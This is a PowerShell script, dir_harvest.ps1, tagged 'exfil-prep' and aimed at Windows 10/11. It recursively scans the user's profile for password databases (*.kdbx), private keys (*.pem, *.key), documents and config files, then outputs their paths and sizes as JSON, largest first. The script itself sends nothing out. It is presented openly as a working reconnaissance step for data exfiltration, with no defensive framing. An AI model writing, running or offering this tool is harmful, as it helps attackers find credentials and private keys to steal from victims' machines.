# lang: PowerShell | file: dir_harvest.ps1 | target: Windows 10/11
# tag: exfil-prep | shell: powershell

param(
    [string]$Root  = "$env:USERPROFILE",
    [string[]]$Ext = @("*.txt","*.pdf","*.docx","*.xlsx","*.kdbx","*.pem","*.key","*.cfg","*.ini","*.json")
)

$results = foreach ($pattern in $Ext) {
    Get-ChildItem -Path $Root -Filter $pattern -Recurse -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, LastWriteTime
}

$results | Sort-Object Length -Descending | ConvertTo-Json -Depth 2
